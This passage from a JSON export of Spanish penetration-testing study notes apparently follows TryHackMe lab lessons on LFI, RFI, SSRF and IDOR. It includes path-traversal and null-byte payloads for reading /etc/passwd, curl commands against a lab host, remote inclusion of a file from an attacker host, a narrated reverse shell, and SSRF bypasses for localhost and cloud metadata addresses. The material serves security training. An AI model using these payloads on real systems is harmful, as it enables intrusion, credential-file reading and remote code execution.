20251106132842.png]]\n8. Obtenemos la flag.\n   ![[Pasted image 20251106133111.png]]\n\n------------------------------------------\n<h2>#2</h2>\nDebes capturar la flag en `/etc/flag2`.\n\n1. Vamos al laboratorio 2, donde vemos el siguiente mensaje:\n   ![[Pasted image 20251106133258.png]]\n2. Miramos en las herramientas de desarrollador:\n   ![[Pasted image 20251106133355.png]]\n3. Vamos a probar cambiando ese valor a \"Admin\". Al refrescar la p√°gina:\n   ![[Pasted image 20251106133455.png]]\n4. Vemos que est√° intentando cargar el archivo \"Admin.php\":\n   ![[Pasted image 20251106133653.png]]\n5. Vamos a intentar cargar el archivo `/etc/flag2`:\n   ![[Pasted image 20251106133738.png]]\n6. Parece que s√≥lo comprueba que la cookie no sea `Guest` y carga el nombre del archivo de la `cookie + .php`. Vamos a probar a usar `NULL BYTE`.\n   ![[Pasted image 20251106133915.png]]\n7. Parece que nos hemos librado de la extensi√≥n `.php` pero no puede llegar al directorio, haremos uso de `../`.\n   ![[Pasted image 20251106134040.png]]\n\n--------------------------------------\n<h2>#3</h2>\nDebes capturar la flag en `/etc/flag3`.\n\n1. Vamos al laboratorio indicado y probamos con un input v√°lido `welcome`:\n   ![[Pasted image 20251106134338.png]]\n2. Probaremos con un input inv√°lido `/etc/flag3`.\n   ![[Pasted image 20251106134415.png]]\n3. Vemos que se est√°n suprimiendo las `/`. Probaremos a meter dos (`//etc//flag3`):\n   ![[Pasted image 20251106134524.png]]\n4. Vemos que tambi√©n se borran, y que adem√°s hay extensi√≥n `.php` forzada. Vamos a probar con el `NULL BYTE`:\n   ![[Pasted image 20251106134714.png]]\n   ![[Pasted image 20251106134737.png]]\n5. Vamos a probar a ver si no filtra alg√∫n car√°cter.\n   ![[Pasted image 20251106140648.png]]\n6. Probaremos en la URL la siguiente lista de los 128 caracteres ASCII URL-encodeados: `%00%01%02%03%04%05%06%07%08%09%0A%0B%0C%0D%0E%0F%10%11%12%13%14%15%16%17%18%19%1A%1B%1C%1D%1E%1F%20%21%22%23%24%25%26%27%28%29%2A%2B%2C%2D%2E%2F%30%31%32%33%34%35%36%37%38%39%3A%3B%3C%3D%3E%3F%40%41%42%43%44%45%46%47%48%49%4A%4B%4C%4D%4E%4F%50%51%52%53%54%55%56%57%58%59%5A%5B%5C%5D%5E%5F%60%61%62%63%64%65%66%67%68%69%6A%6B%6C%6D%6E%6F%70%71%72%73%74%75%76%77%78%79%7A%7B%7C%7D%7E%7F`\n   ![[Pasted image 20251106142647.png]]\n7. Los √∫nicos caracteres no filtrados son a-z. Vamos a intentar cargar un php remoto para leer al flag.\n   ![[Pasted image 20251106143959.png]]\n8. Cargamos un servidor python que liste el archivo:\n   ![[Pasted image 20251106144313.png]]\n9. Probamos desde la URL:\n   ![[Pasted image 20251106144436.png]]\n10. Vamos a probar con curl:\n    `curl http://10.10.19.115/challenges/chall3.php -d \"method=post&file=../../../../etc/flag3\" --output -`\n    ![[Pasted image 20251106150747.png]]\n11. Vemos que sale con `.php` as√≠ que probaremos el `NULL BYTE`:\n    `curl http://10.10.19.115/challenges/chall3.php -d \"method=post&file=../../../../etc/flag3%00\" --output -`\n    ![[Pasted image 20251106150856.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Local File Inclusion - LFI",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/6-file-inclusion/3-local-file-inclusion-lfi/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/6. File Inclusion/3. Local File Inclusion - LFI.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 6. File Inclusion",
    "content": "<h2>Local File Inclusion (LFI)</h2>\nLos ataques LFI contra aplicaciones web, normalmente se deben a la falta de concienciaci√≥n sobre ciberseguridad del desarrollador. Con PHP, usar funciones como `include`, `require`, `include_once` y `require_once` a menudo contribuye a aplicaciones web vulnerables. En esta unidad profundizaremos en PHP.\n\n>[!CAUTION] Debes saber que las vulnerabilidades LFI tambi√©n se producen al usar otros lenguajes como ASP, JSP o Node.js.\n\nEn esta secci√≥n hablaremos de varios casos de `LFI` y c√≥mo explotarlos.\n\n----------------------------------\n<h2>#1</h2>\nSup√≥n que la aplicaci√≥n web ofrece dos lenguajes y el usuario puede seleccionar entre `EN` y `AR`.\n\n```php\n<?PHP \n\tinclude($_GET[\"lang\"]);\n?>\n```\n\nEl c√≥digo PHP de arriba utiliza el m√©todo GET v√≠a par√°metro de la URL `lang` para incluir el archivo de la p√°gina. La llamada se puede hacer mandando la petici√≥n HTTP como procede: `http://webapp.thm/index.php?lang=EN.php` para cargar la p√°gina en ingl√©s o con `AR.php` para cargarla en √°rabe. Los archivos `EN.php` y `AR.php` existen en el mismo directorio.\n\nTe√≥ricamente, podemos acceder y mostrar cualquier archivo en el servidor desde el c√≥digo de arriba si no tiene validaci√≥n de input. Digamos que queremos leer `/etc/passwd`, que contiene informaci√≥n sensible sobre los usuarios del sistema operativo. Podemos buscar `http://webapp.thm/get.php?lang=/etc/passwd`.\n\nEn este caso funciona porque no hay un directorio espec√≠fico en la funci√≥n `include` y no hay validaci√≥n del input.\n\n1. Nos encontramos con un laboratorio en la p√°gina proporcionada.\n   ![[Pasted image 20251105201356.png]]\n2. Probamos a introducir \"test\" en la caja de b√∫squeda.\n   ![[Pasted image 20251105201440.png]]\n3. Nos dice el directorio actual y encima nos dice que no hay ning√∫n archivo \"test\" as√≠ que vamos a probar con otro archivo. Modificamos el enlace:\n   ![[Pasted image 20251105201611.png]]\n\n--------------------------------------------\n<h2>#2</h2>\nDespu√©s, en el c√≥digo siguiente, el desarrollador decide especificar el directorio dentro de la funci√≥n.\n\n```php\n<?PHP \n\tinclude(\"languages/\". $_GET['lang']); \n?>\n```\n\nEl el c√≥digo de arriba, el desarrollador decide usar la funci√≥n `include` para llamar a las p√°ginas del directorio `languages/` v√≠a par√°metro `lang` en la URL.\n\nSi no hay validaci√≥n de input, el atacante puede manipular la URL reemplazando el `/etc/passwd` que hab√≠amos puesto antes por `../../../../../../../../../etc/passwd`. Qued√°ndonos una URL como: `http://webapp.thm/get.php?lang=../../../../../../../../../etc/passwd`.\n\n1. Vamos a la p√°gina dada y nos encontramos con un laboratorio.\n   ![[Pasted image 20251105201712.png]]\n2. Probamos directamente `/etc/passwd` y vemos que no nos lo muestra.\n   ![[Pasted image 20251105201922.png]]\n3. Probamos a ir a `/` mediante `../`.\n   ![[Pasted image 20251105202027.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Local File Inclusion - LFI Continued",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/6-file-inclusion/4-local-file-inclusion-lfi-continued/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/6. File Inclusion/4. Local File Inclusion - LFI Continued.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 6. File Inclusion",
    "content": "Seguimos profundizando con LFI. Ya hemos visto un par de casos pero ahora vamos a meternos de lleno en el asunto.\n\n---------------------------------\n<h2>#3</h2>\nEn los dos primeros casos hemos comprobado el c√≥digo de la aplicaci√≥n web y entonces supimos c√≥mo explotarlo. Sin embargo, en este caso vamos a realizar un black box testing. En este caso, los errores son fundamentales para entender c√≥mo se pasa y procesa la informaci√≥n en la web.\n\nEn este caso, tenemos el siguiente punto de entrada: `http://webapp.thm/index.php?lang=EN`. Si introducimos un input inv√°lido, como THM obtendremos el siguiente error:\n\n```php\nWarning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12\n```\n\nEste mensaje de error revela informaci√≥n relevante. La funci√≥n de inclusi√≥n es `include(languages/THM.php)`, metiendo `THM`. Por lo que un input v√°lido ser√≠a algo como `index.php?lang=EN`, donde el archivo `EN` est√° en el directorio `languages/` y se llama `EN.php`.\n\nAdem√°s, el error nos muestra otro detalle importante sobre el directorio web completo, que es `/var/www/html/THM-4/`.\n\nPara explotar esto vamos a usar el truco `../`. Si probamos lo siguiente: `http://webapp.thm/index.php?lang=../../../../etc/passwd`, obtendremos:\n\n>[!NOTE] Date cuenta de que hemos usado `../` 4 veces porque sabemos que hay cuatro niveles en `/var/www/html/THM-4`.\n\n```php\nWarning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12\n```\n\nParece que podemos movernos fuera del directorio, pero a√∫n as√≠ la funci√≥n lee el input con `.php` al final. Para sobrepasar este requerimiento podemos usar el `NULL BYTE`, que es `%00`.\n\nUsar el `NULL BYTE` es una t√©cnica de inyecci√≥n donde la representaci√≥n URL-encodeada como `%00` o `0x00` (en hex), es usada para terminar la string. Esto enga√±a a la p√°gina para que descarte todo lo que venga detr√°s del `NULL BYTE`.\n\n>[!IMPORTANT] El truco del `NULL BYTE` no funciona en PHP 5.3.4 y superores.\n\n1. Vamos a la p√°gina dada y vemos el laboratorio.\n   ![[Pasted image 20251105212814.png]]\n2. Probamos con `../../../../../etc/passwd` y vemos el error viendo que nos fuerza a que el archivo sea `.php`.\n   ![[Pasted image 20251105213038.png]]\n3. Usamos el m√©todo del `NULL BYTE`.\n   ![[Pasted image 20251105213110.png]]\n\n----------------------------------\n<h2>#4</h2>\nEn esta secci√≥n el desarrollador decidi√≥ filtrar las palabras clave para evitar divulgar informaci√≥n sensible. El archivo `/etc/passwd` ha sido filtrado. Hay dos m√©todos posibles para bypasear el filtro. Primero usando el truco del `NULL BYTE` o del directorio actual al final de `../`. El exploit es parecido a `http://webapp.thm/index.php?lang=/etc/passwd/`. Tambi√©n podemos usar `http://webapp.thm/index.php?lang=/etc/passwd%00`.\n\nPara hacerlo m√°s claro, si probamos este concepto usando `cd ..`, iremos atr√°s un directorio pero si hacemos `cd .` seguiremos en el mismo. De forma similar, si probamos `/etc/passwd/..` acaba siendo `/etc/`, por lo que aplicaremos este concepto y probaremos `/etc/passwd/.` y el resultado ser√° `/etc/passwd`.\n\n1. Llegamos al laboratorio dado y probamos `../../../../../etc/passwd`.\n   ![[Pasted image 20251105213241.png]]\n2. Metemos el punto al final: `../../../../../etc/passwd/.`:\n   ![[Pasted image 20251105213329.png]]\n\n---------------------------------------\n<h2>#5</h2>\nAhora, en los siguientes escenarios, el desarrollador empieza a usar validaci√≥n del input filtrando algunas palabras clave. Comprobemos el mensaje de error:\n\n`http://webapp.thm/index.php?lang=../../../../etc/passwd`\n\nObtuvimos el siguiente error:\n\n```php\nWarning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15\n```\n\nSi comprobamos el mensaje de error en la secci√≥n `include(languages/etc/passwd)`, sabemos que la aplicaci√≥n web cambia `../` por una string vac√≠a. As√≠ que vamos a a√±adir m√°s puntos y barras:\n\n`../../../../etc/passwd` -------------> `....//....//....//....//etc/passwd`\n\n¬øPor qu√© funciona esto? Porque PHP busca coincidencias y las cambia, pero s√≥lo una vez:\n\n![[Pasted image 20251105212005.png]]\n\n1. Llegamos al laboratorio y probamos `../../../../../etc/passwd`, comprobandoi que el output ha eliminado las strings `../`.\n   ![[Pasted image 20251105213608.png]]\n2. Probamos a meterle el doble de puntos y de barras: `../` ---> `....//`:\n   ![[Pasted image 20251105213719.png]]\n\n------------------------------------\n<h2>#6</h2>\nFinalmente veremos el caso donde el desarrollador fuerza el `include` a leer de un directorio determinado. Por ejemplo, si la aplicaci√≥n te pide un input que tiene que incluir un directorio, como: `http://webapp.thm/index.php?lang=languages/EN.php` entonces, para explotar esto, necesitamos incluir el directorio en el payload como: `?lang=languages/../../../../../etc/passwd`.\n\n1. Vamos al laboratorio y probamos con `../../../../../etc/passwd` y vemos el error.\n   ![[Pasted image 20251105214525.png]]\n2. Nos obliga a poner el directorio as√≠ que lo incluimos.\n   ![[Pasted image 20251105214834.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Remote File Inclusion - RFI",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/6-file-inclusion/5-remote-file-inclusion-rfi/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/6. File Inclusion/5. Remote File Inclusion - RFI.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 6. File Inclusion",
    "content": "La Inclusi√≥n Remota de Archivos (Files), RFI, es una t√©cnica para incluir archivos remotos en una aplicaci√≥n vulnerable. Como LFI, RFI ocurre al no sanitizar correctamente el input del usuario, permitiendo al atacante incluir un URL externo en la funci√≥n `include`. Un requerimiento para RFI es que `allow_url_fopen` necesita estar en `on`.\n\nLa RFI es m√°s peligrosa que LFI, ya que permiten al atacante ganar RCE (Ejecuci√≥n Remota de Comandos) en el servidor. Otras consecuencias de un ataque RFI exitoso incluyen:\n\n- Divulgaci√≥n de Informaci√≥n Sensible.\n- Cross-Site Scripting (XSS).\n- Denial of Service (DoS).\n\nUn servidor externo debe comunicarse con la aplicaci√≥n para un RFI exitoso donde el atacante guarde archivos maliciosos que ser√°n inyectados por medio de la URL en la aplicaci√≥n web.\n\n---------------------------------\n<h2>Pasos RFI</h2>\n![[Pasted image 20251106114126.png]]\n\nLa imagen de arriba muestra un ejemplo de los pasos para un ataque RFI exitoso. Digamos que el atacante hostea un archivo PHP en su propio servidor `http://attacker.thm/cmd.txt` donde `cmd.txt` contiene un mensaje `Helo THM`.\n\n```php\n<?PHP echo \"Hello THM\"; ?>\n```\n\nPrimero, el atacante inyecta la URL maliciosa, la cual apunta al servidor del atacante, como: `http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt`. Si no hay validaci√≥n de input, entonces la URL maliciosa se pasa a la funci√≥n `include`. Entonces, la aplicaci√≥n web mandar√° un `GET` al servidor malicioso para cargar el archivo. En nuestro caso, la aplicaci√≥n web mostrar√° `Hello THM`.\n\n1. Primero vamos a crear un archivo PHP que nos deje ejecutar comandos.\n   ![[Pasted image 20251106122527.png]]\n2. Nos ponemos en escucha con `python`:\n   ![[Pasted image 20251106120922.png]]\n3. Abrimos un listener con `nc`.\n   ![[Pasted image 20251106123728.png]]\n4. Copiamos la reverse shell URLencodeada:\n   ![[Pasted image 20251106123838.png]]\n5. Encodeamos las partes necesarias de la URL (todo menos las direcciones IP):\n   ![[Pasted image 20251106124615.png]]\n6. Lo metemos en la URL del laboratorio (no en la caja de buscar) y obtenemos una shell.\n   ![[Pasted image 20251106124734.png]]\n7. Ejecutamos el comando requerido:\n   ![[Pasted image 20251106124821.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. What is SSRF",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/7-intro-to-ssrf/1-what-is-ssrf/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/7. Intro to SSRF/1. What is SSRF.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 7. Intro to SSRF",
    "content": "En esta lecci√≥n aprenderemos lo que es SSRF, qu√© tipo de impacto puede tener, veremos ejemplos de ataques SSRF, c√≥mo descubrir vulnerabilidades SSRF, c√≥mo circunvalar reglas de input y un caso pr√°ctico para resolver con las nuevas habilidades aprendidas.\n\n----------------------------\n<h2>¬øQu√© es un SSRF?</h2>\nSSRF quiere decir Server-Side Request Forgery (Falsificaci√≥n de Petici√≥n del Lado del Servidor). Es una vulnerabilidad que permite a un actor malicioso causar que el servidor web haga un petici√≥n HTTP adicional o editada al recurso de elecci√≥n del atacante.\n\n--------------------------------\n<h2>Tipos de SSRF</h2>\nHay dos tipos de SSRF:\n\n- **Regular:** Es cuando la informaci√≥n se devuelve a la pantalla del atacante.\n- **Blind:** Es cuando no se devuelve informaci√≥n a la pantalla del atacante, aunque est√© la vulnerabilidad.\n\n----------------------------------\n<h2>¬øCu√°l es el Impacto?</h2>\nUn ataque SSRF exitoso puede resultar en:\n\n- Acceso a √°reas no autorizadas.\n- Acceso a informaci√≥n del cliente u organizaci√≥n.\n- Habilidad para escalar redes internas.\n- Revelar credenciales/tokens de autentificaci√≥n.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. SSRF Examples",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/7-intro-to-ssrf/2-ssrf-examples/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/7. Intro to SSRF/2. SSRF Examples.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 7. Intro to SSRF",
    "content": "Veamos los siguientes ejemplos:\n\nEl ejemplo de abajo muestra c√≥mo el atacante tiene control completo sobre la p√°gina pedida por el servidor. La petici√≥n esperada es lo que espera recibir el servidor. La secci√≥n en rojo es la URL que la aplicaci√≥n cargar√° para la informaci√≥n. El atacante puede modificar el √°rea en rojo a una URL de su elecci√≥n.\n\n![[Pasted image 20251106160249.png]]\n\nEl ejemplo de abajo muestra c√≥mo un atacante puede llegar a la p√°gina `/api/user` teniendo control s√≥lo sobre la ruta, utilizando Directory Traversal. Cuando una p√°gina web recibe `../` es un mensaje de moverse hacia arriba entre directorios, lo que elimina la porci√≥n `stock` y convierte la petici√≥n final en `/api/user`.\n\n![[Pasted image 20251106160604.png]]\n\nEn el ejemplo de abajo se muestra c√≥mo el atacante puede controlar el subdominio del servidor hacia el que se hace la petici√≥n. Toma nota del payload acabando en `&x=`. Esto es usado para parar el resto de la ruta de ser a√±adida al final de la URL del atacante y en su lugar lo convierte en el par√°metro (`?x=`) en la sentencia final.\n\n![[Pasted image 20251106160818.png]]\n\nEn el ejemplo de abajo se muestra c√≥mo un atacante puede forzar al servidor a realizar una petici√≥n al servidor de elecci√≥n del atacante. Haciendo eso puede capturar headers de petici√≥n que podr√≠an contener credenciales o claves API mandados por el servidor.\n\n![[Pasted image 20251106161318.png]]\n\nAs√≠ se resuelve el ejercicio planteado:\n\n![[Pasted image 20251106162203.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Finding an SSRF",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/7-intro-to-ssrf/3-finding-an-ssrf/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/7. Intro to SSRF/3. Finding an SSRF.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 7. Intro to SSRF",
    "content": "Vulnerabilidades potenciales SSRF se pueden encontrar en las aplicaciones web de varias formas diferentes. Aqu√≠ un ejemplo de sitios comunes en los que buscar:\n\n<h6>Cuando se usa una URL entera en un par√°metro de la barra de b√∫squeda</h6>\n![[Pasted image 20251106162343.png]]\n\n<h6>Un par√°metro escondido en un formulario</h6>\n![[Pasted image 20251106162411.png]]\n\n<h6>Una URL parcial como el nombre de host</h6>\n![[Pasted image 20251106162437.png]]\n\n<h6>S√≥lo la ruta de la URL</h6>\n![[Pasted image 20251106162504.png]]\n\n------------------------------------\nAlgunos de estos ejemplos son m√°s f√°ciles de explicar que otros, y aqu√≠ es donde entra la prueba y error para encontrar un payload v√°lido.\n\nSi trabajas con un SSRF blind, donde no se muestra output, necesitar√°s usar una herramienta de registro HTTP externa para monitorizar las peticiones como [esta](https://requestbin.com), tu propio servidor HTTP o Burp Suite.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Defeating Common SSRF Defenses",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/7-intro-to-ssrf/4-defeating-common-ssrf-defenses/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/7. Intro to SSRF/4. Defeating Common SSRF Defenses.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 7. Intro to SSRF",
    "content": "Los desarrolladores m√°s expertos en seguridad, conscientes de los riesgos de SSRF, pueden implementar comprobaciones en sus aplicaciones para asegurarse de que los recursos solicitados cumplen con reglas espec√≠ficas. Hay generalmente dos formas de hacer esto: lista de denegaci√≥n y lista de aceptaci√≥n.\n\n-------------------------------------\n<h2>Lista de Denegaci√≥n</h2>\nUna lista de denegaci√≥n es donde las peticiones son aceptadas aparte de los recursos especificados en una lista o coincidiendo con un patr√≥n determinado. Una aplicaci√≥n web puede emplear una lista de denegaci√≥n para proteger ante acceso a endpoints sensible, direcciones IP o dominios. Un endpoint espec√≠fico al que prohibir acceso es localhost, que puede contener informaci√≥n sobre el desempe√±o del servidor o informaci√≥n m√°s sensible, por lo que dominios como `localhost` y `127.0.0.1` aparecer√≠an en esta lista. Los atacantes pueden bypassear esta lista usando referencias al localhost alternativas como: `0`, `0.0.0.0`, `0000`, `127.1`, `127.*.*.*`, `2130706433`, `017700000001`; o subdominios que tengan un registro DNS que resuelva a la direcci√≥n IP `127,0,0,1`, como: `127.0.0.1.nip.io`.\n\nAdem√°s, en un entorno de nube, podr√≠a ser beneficioso bloquear el acceso a la direcci√≥n IP `169.254.169.254`, que contiene metadatos para el servidor nube desplegado. Un atacante puede bypassear esto registrando un subdominio en su propio dominio con un registro DNS que apunte a la direcci√≥n IP `169.254.169.254\n\n----------------------------------\n<h2>Lista de Aceptaci√≥n</h2>\nUna lista de aceptaci√≥n es donde las peticiones son denegadas a no ser que aparezcan en una lista o coincidan con un patr√≥n en concreto, como la regla de que una URL que se introduce como par√°metro debe comenzar con `https://website.thm`. Un atacante podr√≠a circunvalar esta medida creando un subdominio en su propio dominio como `https://website.thm.attackers-domain.thm`. La aplicaci√≥n comprobar√≠a que empieza por lo que se pide y ser√≠a aceptada.\n\n---------------------------------\n<h2>Redirecci√≥n Abierta</h2>\nSi los bypasses anteriores no funcionan, hay un truco m√°s en la manga de lo atacantes, la redirecci√≥n abierta. Una redirecci√≥n abierta es un endpoint en el servidor donde el visitante web es redirigido autom√°ticamente a otra direcci√≥n web. Por ejemplo, el link `https://website.thm/link?url=https://tryhackme.com`. Este endpoint fue creado para registrar el n√∫mero de veces que los visitantes han hecho click en ese link por motivos de marketing. Pero imagina que hubiera una vulnerabilidad potencial SSRF con reglas estrictas que s√≥lo permitieran las URLs que comienzan con `https://website.thm/`. Un atacante podr√≠a utilizar la funcionalidad de arriba para redirigir las peticiones HTTP internas a un dominio de la elecci√≥n del atacante.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. SSRF Practical",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/7-intro-to-ssrf/5-ssrf-practical/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/7. Intro to SSRF/5. SSRF Practical.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 7. Intro to SSRF",
    "content": "Pongamos a prueba lo que hemos aprendido con un escenario pr√°ctico.\n\nNos hemos encontrado con dos endpoints nuevos durante el ejercicio de descubrimiento de contenido sobre la p√°gina de **Acme IT Support**. \n\nEl primero es **/private**, que nos da un mensaje de error explicando que los contenidos no pueden ser vistos desde nuestra IP.\n\n![[Pasted image 20251106191916.png]]\n\nEl segundo es **/customers/new-account-page** con una nueva funcionalidad que permite a los clientes elegir un avatar para su cuenta.\n\n![[Pasted image 20251106192128.png]]\n\n------------------------------\n<h2>Challenge</h2>\n1. Seleccionamos un avatar y miramos el c√≥digo fuente del segundo endpoint:\n   ![[Pasted image 20251106192450.png]]\n   Aqu√≠ podemos ver que el avatar actual est√° siendo mostrado usando el esquema URI y que el contenido est√° codificado en base64.\n2. Ahora vamos a intentar hacer la petici√≥n de nuevo pero cambiando el valor del avatar a **private** con la esperanza de que el servidor acceda al recurso primero. Para hacer esto buscamos un bot√≥n circular que selecciona el avatar y cambiamos el valor \"value\".\n   ![[Pasted image 20251106192956.png]]\n3. Hacemos click en el avatar que hemos cambiado y mandamos la petici√≥n.\n   ![[Pasted image 20251106193110.png]]\n4. Nos sale el siguiente error:\n   ![[Pasted image 20251106193129.png]]\n   Por lo tanto ya sabemos que no puede empezar con \"/private\". Vamos a usar lo aprendido durante el RFI para bypassear esta medida de seguridad.\n5. Volvemos a inspeccionar el bot√≥n del avatar y cambiamos la direcci√≥n de la foto por una direcci√≥n que no empieza por `/private` pero que nos lleva al mismo directorio, por ejemplo: `s/../private`.\n   ![[Pasted image 20251106193350.png]]\n6. Se ha cambiado el avatar:\n   ![[Pasted image 20251106193448.png]]\n7. Miramos el c√≥digo fuente:\n   ![[Pasted image 20251106193524.png]]\n8. Decodeamos la base64 para obtener el contenido de `/private`:\n   ![[Pasted image 20251106193637.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Intro to SSRF",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/7-intro-to-ssrf/0-intro-to-ssrf/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/7. Intro to SSRF/0. Intro to SSRF.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 7. Intro to SSRF",
    "content": "[[1. What is SSRF]]\n[[2. SSRF Examples]]\n[[3. Finding an SSRF]]\n[[4. Defeating Common SSRF Defenses]]\n[[5. SSRF Practical]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Finding IDORs in Hashed IDs",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/5-idor/4-finding-idors-in-hashed-ids/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/5. IDOR/4. Finding IDORs in Hashed IDs.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 5. IDOR",
    "content": "<h2>Hashed IDs</h2>\nLos IDs hasheados son un poco m√°s complicados de lidiar que los encodeados, pero suelen seguir un patron predecible, como ser la versi√≥n hasheada de un valor entero. Por ejemplo, el n√∫mero de ID 123 seria el hash md5 `202cb962ac59075b964b07152d234b70`.\n\nMerece la pena poner los hashes descubiertos en p√°ginas como [CrackStation](https://crackstation.net/).",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. A practical IDOR Example",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/5-idor/7-a-practical-idor-example/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/5. IDOR/7. A practical IDOR Example.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 5. IDOR",
    "content": "1. Vamos a la p√°gina dada y nos registramos\n   ![[Pasted image 20251104142403.png]]\n2. Si vamos a la pesta√±a de informaci√≥n vemos que los par√°metros est√°n rellenos autom√°ticamente, as√≠ que vamos a investigar c√≥mo se llenan:\n   ![[Pasted image 20251104142457.png]]\n3. Si abrimos las herramientas de desarrollador y buscamos en la pesta√±a network, podemos ver un par√°metro **customer?id=X**.\n   ![[Pasted image 20251104142658.png]]\n4. Si le damos click derecho y a editar y volver a mandar, podemos modificar el valor a la izquierda y mandarlo de nuevo:\n   ![[Pasted image 20251104142830.png]]\n5. Cambiamos el valor a \"1\" y a \"3\" y los mandamos:\n   ![[Pasted image 20251104142910.png]]\n6. Si hacemos doble click en el par√°metro podemos ver la respuesta del servidor:\n   ![[Pasted image 20251104143006.png]]\n   ![[Pasted image 20251104143102.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. An IDOR Exaxmple",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/5-idor/2-an-idor-exaxmple/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/5. IDOR/2. An IDOR Exaxmple.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 5. IDOR",
    "content": "Imagina que te acabas de registrar para un servicio online y ahora quieres cambiar tu informaci√≥n de perfil. El link en el que haces click es `http://online-service.thm/profile?user_id=1305` y puedes ver tu informaci√≥n.\n\nLa curiosudad se apodera de ti e intentas cambiar el valor del ID a 100 en su lugara y para tu sorpresa puedes ver la informaci√≥n de otro usuario. Acabas de descubrir una vulnerabilidad IDOR. Idealmente, deber√≠a haber una comprobaci√≥n en la web que confirme que la informaci√≥n desplegada pertenece a tu usuario.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Finding IDORs in Unpredictable IDs",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/5-idor/5-finding-idors-in-unpredictable-ids/",
